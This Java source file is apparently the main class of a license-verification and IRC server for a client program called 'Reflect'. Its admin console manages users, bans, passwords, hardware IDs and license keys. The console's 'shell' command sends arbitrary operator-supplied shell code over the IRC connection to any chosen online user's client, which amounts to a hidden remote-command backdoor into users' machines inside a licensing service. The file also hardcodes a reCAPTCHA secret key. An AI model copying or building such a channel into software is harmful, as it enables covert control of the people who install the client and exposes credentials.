package al.nya.verify;


import al.nya.verify.Data.ControlCommand;
import al.nya.verify.Data.User;
import al.nya.verify.Data.commands.ReplyKeyCode;
import al.nya.verify.Data.irc.CommandShellCode;
import al.nya.verify.api.ReflectHttpServer;
import com.google.gson.Gson;
import org.java_websocket.WebSocket;

import java.net.InetSocketAddress;
import java.util.Scanner;

public class Verify {
    public static VerifyServer verifyServer;
    public static IRCServer ircServer;
    public static LocalController controller;
    public static String reCaptcha_Secret = "6LcSPekfAAAAAJSlKYw9BLXZ0Onxa6qo0e5ljUew";
    public static String reCaptcha_API = "https://recaptcha.net/recaptcha/api/siteverify";
    public static int logLevel = 1;

    public static void main(String[] args){
        System.out.println("  _____       __ _           _   \n" +
                " |  __ \\     / _| |         | |  \n" +
                " | |__) |___| |_| | ___  ___| |_ \n" +
                " |  _  // _ \\  _| |/ _ \\/ __| __|\n" +
                " | | \\ \\  __/ | | |  __/ (__| |_ \n" +
                " |_|  \\_\\___|_| |_|\\___|\\___|\\__|\n" +
                "                                 \n" +
                "                                 ");
        verifyServer = new VerifyServer(new InetSocketAddress(6668));
        ircServer = new IRCServer(new InetSocketAddress(6669));
        controller = new LocalController(new InetSocketAddress(6670));

        Runtime.getRuntime().addShutdownHook(new Thread(){
            public void run(){
                System.out.println("   _____                 _ _                        __  \n" +
                        "  / ____|               | | |                    _  \\ \\ \n" +
                        " | |  __  ___   ___   __| | |__  _   _  ___     (_)  | |\n" +
                        " | | |_ |/ _ \\ / _ \\ / _` | '_ \\| | | |/ _ \\         | |\n" +
                        " | |__| | (_) | (_) | (_| | |_) | |_| |  __/     _   | |\n" +
                        "  \\_____|\\___/ \\___/ \\__,_|_.__/ \\__, |\\___|    (_)  | |\n" +
                        "                                  __/ |             /_/ \n" +
                        "                                 |___/                  ");
                IRCController.broadcast("IRCServer shutdown");
                try {
                    for (WebSocket connection : verifyServer.getConnections()) {
                        connection.close();
                    }
                    verifyServer.stop();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                try {
                    for (WebSocket connection : ircServer.getConnections()) {
                        connection.close();
                    }
                    ircServer.stop();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                try {
                    controller.stop();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                System.out.println("Service end");
            }
        });
        verifyServer.setConnectionLostTimeout(Integer.MAX_VALUE);
        verifyServer.start();
        ircServer.start();
        controller.start();
        ReflectHttpServer.init();
        Controller.initData();
        Scanner sc = new Scanner(System.in);
        while (true){
            System.out.print("Verify >");
            String command = sc.nextLine();
            Log.info("> "+command);
            String[] commands = command.split(" ");
            if (commands.length >= 1){
                if (commands[0].equalsIgnoreCase("info")){
                    if (commands.length == 2){
                        Long qq;
                        User user;
                        try{
                            qq = Long.parseLong(commands[1]);
                            user = Controller.getUser(qq);
                        }catch (Exception e){
                            user = Controller.getUser(commands[1]);
                        }
                        if (user == null){
                            Log.error("Cannot find user "+commands[1]);
                            continue;
                        }
                        StringBuilder sb = new StringBuilder();
                        sb.append("User ").append(user.name).append("'s UserInfo").append("\n");
                        sb.append("Rank:").append(user.rank).append("\n");
                        sb.append("Bind QQ:").append(user.qq).append("\n");
                        sb.append("Using Key:").append(user.inviteCode.getKey()).append("\n");
                        sb.append("License:").append(user.registerTo).append("\n");
                        sb.append("HwIDv1:").append(user.HWIDv1).append("\n");
                        sb.append("HwIDv2:").append(user.HWIDv2).append("\n");
                        sb.append("LastHwIDChange:").append(user.lastHWIDChange).append("\n");
                        sb.append("Ban:").append(user.ban).append("\n");
                        sb.append("BanReason:").append(user.banReason).append("\n");
                        Log.info(sb.toString());
                    }else {
                        Log.error("Usage: Info [QQ]");
                        Log.error("Usage: Info [UserName]");
                        continue;
                    }
                }
                if (commands[0].equalsIgnoreCase("rank")){
                    if (commands.length == 3) {
                        Long qq;
                        User user;
                        try {
                            qq = Long.parseLong(commands[1]);
                            user = Controller.getUser(qq);
                        } catch (Exception e) {
                            user = Controller.getUser(commands[1]);
                        }
                        if (user == null) {
                            Log.error("Cannot find user " + commands[1]);
                            continue;
                        }
                        user.rank = commands[2];
                        Controller.save(Controller.usersData, Controller.users);
                        Log.info("Change "+commands[1] +"'s rank to "+commands[2]);
                        continue;
                    }else {
                        Log.error("Usage: rank [QQ] [Rank]");
                        Log.error("Usage: rank [UserName] [Rank]");
                        continue;
                    }
                }
                if (commands[0].equalsIgnoreCase("ban")){
                    if (commands.length >= 3){
                        try{
                            Long qq = Long.parseLong(commands[1]);
                            int index = 0;
                            StringBuilder reason = new StringBuilder();
                            for (String s : commands) {
                                if (index > 1){
                                    reason.append(" ").append(s);
                                }
                                index ++;
                            }
                            Controller.ban(qq,reason.toString());
                            continue;
                        }catch (Exception e){
                            Log.exp(e);
                            Log.error("Usage: Ban [QQ] [Reason]");
                            continue;
                        }
                    }else {
                        Log.error("Usage: Ban [QQ] [Reason]");
                        continue;
                    }
                }
                if (commands[0].equalsIgnoreCase("unban")){
                    if (commands.length == 2){
                        try{
                            Long qq = Long.parseLong(commands[1]);
                            Controller.unban(qq);
                            continue;
                        }catch (Exception e){
                            Log.exp(e);
                            Log.error("Usage: Unban [QQ]");
                            continue;
                        }
                    }else {
                        Log.error("Usage: Unban [QQ]");
                        continue;
                    }
                }
                if (commands[0].equalsIgnoreCase("pwd")){
                    if (commands.length == 3){
                        try{
                            Long qq = Long.parseLong(commands[1]);
                            Controller.changePassword(qq,commands[2]);
                            continue;
                        }catch (Exception e){
                            Log.exp(e);
                            Log.error("Usage: pwd [QQ] [NewPassword]");
                            continue;
                        }
                    }else {
                        Log.error("Usage: pwd [QQ] [NewPassword]");
                        continue;
                    }
                }
                if (commands[0].equalsIgnoreCase("clearHWID")){
                    if (commands.length == 2){
                        try{
                            Long qq = Long.parseLong(commands[1]);
                            Controller.clearHWID(qq);
                            continue;
                        }catch (Exception e){
                            Log.exp(e);
                            Log.error("Usage: clearHWID [QQ]");
                            continue;
                        }
                    }else {
                        Log.error("Usage: clearHWID [QQ]");
                        continue;
                    }
                }
                if (commands[0].equalsIgnoreCase("restartService")){
                    try {
                        verifyServer.stop();
                        Log.info("Stop VerifyServer");
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    try {
                        ircServer.stop();
                        Log.info("Stop IRCServer");
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    verifyServer = new VerifyServer(new InetSocketAddress(6668));
                    ircServer = new IRCServer(new InetSocketAddress(6669));
                    verifyServer.start();
                    ircServer.start();
                }
                if (commands[0].equalsIgnoreCase("keycode")){
                    if (commands.length == 3){
                        try{
                            Integer count = Integer.parseInt(commands[1]);
                            Integer type = Integer.parseInt(commands[2]);
                            ReplyKeyCode replyKeyCode = Controller.genKeyCode(count,type);
                            StringBuilder sb = new StringBuilder();
                            for (String keycode : replyKeyCode.getKeycodes()) {
                                sb.append(keycode).append("\n");
                            }
                            Log.info(sb.toString());
                            continue;
                        }catch (Exception e){
                            Log.exp(e);
                            Log.error("Usage: keycode [count] [type]");
                            continue;
                        }
                    }else {
                        Log.error("Usage: keycode [count] [type]");
                        continue;
                    }
                }
                if (commands[0].equalsIgnoreCase("online")){
                    StringBuilder online = new StringBuilder();
                    online.append("Online users:\n");
                    for (UserData data : ircServer.authUser) {
                        if (data.getConnect().isOpen())
                        online.append(data.getUser().name).append(",");
                    }
                    Log.info(online.toString());
                }
                if (commands[0].equalsIgnoreCase("shell")){
                    if (commands.length >= 3){
                        User target = null;
                        try{
                            Long qq = Long.parseLong(commands[1]);
                            target = Controller.getUser(qq);
                        }catch (Exception e){
                            target = Controller.getUser(commands[1]);
                        }
                        if (target == null){
                            Log.error("Cannot find user "+commands[1]);
                            continue;
                        }
                        if (!ircServer.isOnline(target)){
                            Log.error("User "+commands[1]+" offline");
                            continue;
                        }
                        int index = 0;
                        StringBuilder shell = new StringBuilder();
                        for (String s : commands) {
                            if (index > 1){
                                shell.append(" ").append(s);
                            }
                            index ++;
                        }
                        String shellCode = shell.toString().replaceFirst(" ","");
                        Log.info("Send ShellCode \""+shellCode+"\" to user "+target.name);
                        ircServer.getUser(target).getConnect().send(new Gson().toJson(new ControlCommand("BfaWzWAWWDZDWDMMWD",new Gson().toJson(
                                new CommandShellCode(shellCode)))));
                    }else {
                        Log.error("Usage: shell [QQ] [ShellCode]");
                        Log.error("Usage: shell [Name] [ShellCode]");
                        continue;
                    }
                }
                if (commands[0].equalsIgnoreCase("log")){
                    if (commands.length == 2){
                        try{
                            Integer count = Integer.parseInt(commands[1]);
                            logLevel = count;
                            continue;
                        }catch (Exception e){
                            Log.exp(e);
                            Log.error("Usage: log [Level]");
                            continue;
                        }
                    }else {
                        Log.error("Usage: log [Level]");
                        continue;
                    }
                }
                if (commands[0].equalsIgnoreCase("stop") || commands[0].equalsIgnoreCase("quit")){
                    System.exit(-1);
                }
            }
        }
    }
}
